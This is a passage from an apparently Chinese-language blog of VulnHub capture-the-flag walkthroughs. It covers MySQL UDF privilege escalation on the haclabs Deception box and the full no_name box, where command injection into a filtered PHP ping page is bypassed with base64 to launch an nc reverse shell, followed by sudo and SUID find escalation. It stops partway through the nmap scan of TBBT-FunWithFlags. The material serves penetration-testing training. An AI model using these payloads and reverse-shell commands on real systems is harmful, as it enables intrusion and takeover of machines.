class="line">ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl&#x2F;dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A&#x3D;123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389</span><br></pre></td></tr></table></figure><p>可以看到有三段内容用引号标识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;haclabs&quot;</span><br><span class="line">&quot;A&#x3D;123456789&quot;</span><br><span class="line">&quot;+A[::-1]&quot;</span><br></pre></td></tr></table></figure><p>尝试后得出账户haclabs的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs987654321</span><br></pre></td></tr></table></figure><p>切换至账户haclabs</p><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">haclabs987654321</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><p>sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),27(sudo)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>Mysql UDF提权</p></blockquote><p>拿到yash账户后提权遇到瓶颈，上传了脚本linuxprivchecker，运行过后报告可能存在Mysql的UDF提权的可能<br />查阅了相关资料之后发现几个问题</p><ul><li>需要root账户</li><li>secure_file_priv</li><li>plugin_dir</li></ul><p>可以先在wordpress的配置文件中获取账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;cry4moon&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure><p>拿到账户之后再使用mysql客户端登入服务<br /><code>mysql -h localhost -u wordpressuser -pcry4moon</code><br />再查看root账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| host          | user             | authentication_string                     |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| localhost     | root             | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 |</span><br><span class="line">| %             | haclabs          | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 |</span><br><span class="line">| localhost     | phpmyadmin       | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| wordpressuser | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpressuser    | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">9 rows in set (0.20 sec)</span><br></pre></td></tr></table></figure><p>可以看到localhost账户的密码hash和wordpressuser的一样，即都是<code>cry4moon</code><br />但是无法登入，测试时重新设置了密码，操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string&#x3D;PASSWORD(&quot;cry4moon&quot;) where user&#x3D;&#39;root&#39;;</span><br><span class="line">update mysql.user set plugin&#x3D;&quot;mysql_native_password&quot;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>完成更改密码之后即可以root账户登入</p><p>而UDF提权则需要在插件目录写入文件，关于目录可以用以下命令查阅</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;plugin_dir&#39;;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure><p>即<code>/usr/lib/mysql/plugin/</code></p><p>而在写入文件时会发生错误，原因是<code>secure_file_priv</code>参数对于文件写入存在限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| Variable_name    | Value                 |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| secure_file_priv | &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>即只能写入目录<code>/var/lib/mysql-files/</code>，子目录下也不行</p><ul><li>若该值为空，则无限制</li><li>若该值为NULL，则不可写入</li></ul><p>提权需要将文件作为插件写入plugin_dir，但与参数<code>secure_file_priv</code>冲突，故写入时会报错。而参数<code>secure_file_priv</code>为只读参数，不能再mysql客户端中更改，只能修改mysqld.cnf，写入&quot;secure_file_priv=&quot;，并且重启mysql服务，才能继续进行UDF提权。</p><p>之后发生玄学运维，手动修改了secure_file_priv参数，权限777的路径写入文件会报错权限否认，手动移动的so文件可以载入但是不能执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf2.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure><p>linux下的so文件与windows下的dll文件在MSF中都有附带</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/haclabs-deception-walkthrough-vulnhub/">WP</a><br /><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">UDF</a><br /><a href="https://www.cnblogs.com/mrhonest/p/10836621.html">UDF</a><br /><a href="https://www.cnblogs.com/Tdazheng/p/10742929.html">Mysql.pass</a></p></blockquote><hr /><h1 id="no_name"><a class="markdownIt-Anchor" href="#no_name"></a> <a href="https://www.vulnhub.com/entry/haclabs-no_name,429/">no_name</a></h1><p><code>2020/03/27 01:05:37</code></p><h2 id="端口扫描-13"><a class="markdownIt-Anchor" href="#端口扫描-13"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -T5 -sV -A -n -v 192.168.31.196</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.196</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 78:2b:f7:57:bf:da:fd:ec:e0:d5:60:c4:8b:53:62:fd (RSA)</span><br><span class="line">|   256 36:82:4a:8b:71:f7:78:da:49:42:f9:88:6d:26:73:6a (ECDSA)</span><br><span class="line">|_  256 dc:18:8e:b3:36:53:cb:10:34:98:57:3d:f0:a1:2b:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">MAC Address: 08:00:27:59:63:EF (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 18.412 days (since Sun Mar  8 03:06:40 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-13"><a class="markdownIt-Anchor" href="#web路径枚举-13"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.196/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.196&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;admin (CODE:200|SIZE:417)                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;index.php (CODE:200|SIZE:201)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><p>访问<code>/index.php</code></p><ul><li>显示<code>Fake Admin Area</code></li><li>任意提交查询则回显<code>Fake ping executed</code></li></ul><p>访问<code>/admin</code></p><ul><li>有四个图片文件</li><li>源代码中有提示信息<code>passphrase:harder</code></li></ul><h2 id="漏洞利用-13"><a class="markdownIt-Anchor" href="#漏洞利用-13"></a> 漏洞利用</h2><p>使用<code>steghide</code>工具进行分析<br />发现图片文件<code>haclabs.jpeg</code>存在隐写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf haclabs.jpeg  -p harder</span><br><span class="line">wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">cat imp.txt </span><br><span class="line">c3VwZXJhZG1pbi5waHA&#x3D;</span><br><span class="line">echo &quot;c3VwZXJhZG1pbi5waHA&#x3D;&quot; | base64 -d</span><br><span class="line">superadmin.php</span><br></pre></td></tr></table></figure><p>访问<code>/superadmin.php</code></p><ul><li>存在ping功能</li></ul><p>尝试进行命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">| cat superadmin.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   if (isset($_POST[&#39;submitt&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">   $word&#x3D;array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;&#x2F;&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);</span><br><span class="line">   $pinged&#x3D;$_POST[&#39;pinger&#39;];</span><br><span class="line">   $newStr &#x3D; str_replace($word, &quot;&quot;, $pinged);</span><br><span class="line">   if(strcmp($pinged, $newStr) &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    $flag&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">       else</span><br><span class="line">&#123;</span><br><span class="line">   $flag&#x3D;0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag&#x3D;&#x3D;1)&#123;</span><br><span class="line">$outer&#x3D;shell_exec(&quot;ping -c 3 $pinged&quot;);</span><br><span class="line">echo &quot;$outer&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有两种获取shell的方法</p><ul><li>使用wget下载php一句话木马</li><li>使用nc反弹shell</li></ul><p>过滤可以使用base64编码进行绕过<br /><code>|echo &quot;xxxx&quot;|base64 -d|bash</code><br />xxxx即为要执行的命令的base64编码的结果</p><p><strong>wget</strong><br />写入文件失败，可能没有权限</p><p><strong>nc</strong></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc.traditional -e &#x2F;bin&#x2F;bash 192.168.31.10 9900&quot; | base64</span><br><span class="line">bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>接收到反弹shell</p><h2 id="权限提升-13"><a class="markdownIt-Anchor" href="#权限提升-13"></a> 权限提升</h2><p>获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在yash的home目录发现flag1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">Due to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure><p>搜索拥有者为yash的文件/文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user yash 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;home&#x2F;yash</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bashrc</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;motd.legal-displayed</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.profile</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bash_history</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;private-keys-v1.d</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;nano</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure><p>可以使用find命令进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root find &#x2F;etc&#x2F;passwd -exec passwd root \;</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>SUID-find</p></blockquote><p>其实在<code>www-data</code>权限时就可以使用find命令进行操作</p><p>查看SUID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure><p>可以通过find命令来进行读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec ls -la &#x2F;root \;</span><br><span class="line"></span><br><span class="line">total 40</span><br><span class="line">drwx------  6 root root 4096 Feb 15 16:28 .</span><br><span class="line">drwxr-xr-x 25 root root 4096 Mar 26 17:07 ..</span><br><span class="line">-rw-------  1 root root   41 Mar 26 17:22 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Jan 30 06:53 .cache</span><br><span class="line">drwx------  5 root root 4096 Jan 30 03:06 .config</span><br><span class="line">drwx------  3 root root 4096 Jan 27 16:46 .gnupg</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jan 27 16:56 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root   97 Jan 30 04:29 flag3.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec cat &#x2F;root&#x2F;flag3.txt \;</span><br><span class="line"></span><br><span class="line">Congrats!!!You completed the challenege!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   ()    ()</span><br><span class="line"></span><br><span class="line"> \      &#x2F;</span><br><span class="line">  ----------</span><br></pre></td></tr></table></figure><p>但是通过find来命令执行时存在限制的，并不是完全以root账户的身份去执行</p><p>在本地测试之后得出如下结论</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure><ul><li>*** 分别代表权限的三位，其中*为通配，表示任意权限</li><li>**2， linux中的权限可以线性叠加，**2即代表需要仅写权限，在**3, **6, **7的情况下也是适用的</li><li>bash意为该文件作为bash的参数来执行(bash <a href="http://run.sh">run.sh</a>)，exec则表示作为可执行程序来执行(./run.sh)</li></ul><p>由此看来应当是继承了root的r-x权限，但是直接获取bash则还是以原用户的身份来获取，并不能获取root权限的bash；也不能通过passwd来修改root账户的密码(即使euid=0)</p><blockquote><p>nc.traditional/nc</p></blockquote><ul><li>nc.traditional是最早的版本(v1.10-41.1)，该版本具有<code>-e</code>的选项，用于反弹shell十分方便</li><li>ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有<code>-e</code>的选项，无法用于反弹shell</li><li>ncat的版本则比较新，集成于nmap中</li></ul><p>参考资料</p><blockquote><p><a href="https://www.runoob.com/linux/linux-shell.html">exec</a><br /><a href="https://www.hacknos.com/haclabs-no_name-walkthrough-vulnhub-ctf/">WP</a><br /><a href="https://www.sqlsec.com/2019/10/nc.html">nc</a></p></blockquote><h1 id="tbbt-funwithflags"><a class="markdownIt-Anchor" href="#tbbt-funwithflags"></a> <a href="https://www.vulnhub.com/entry/tbbt-funwithflags,437/">TBBT-FunWithFlags</a></h1><p><code>2020/03/31 13:24:54</code></p><blockquote><p>靶机未启用DHCP，故使用了默认的静态IP:192.168.1.105。若本机网段不是192.168.1.*，需要在VB中创建一个192.168.1.*网段的Host-Only Ethernet Adapter</p></blockquote><h2 id="端口扫描-14"><a class="markdownIt-Anchor" href="#端口扫描-14"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -A -sV -T5 -n -v 192.168.1.105</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 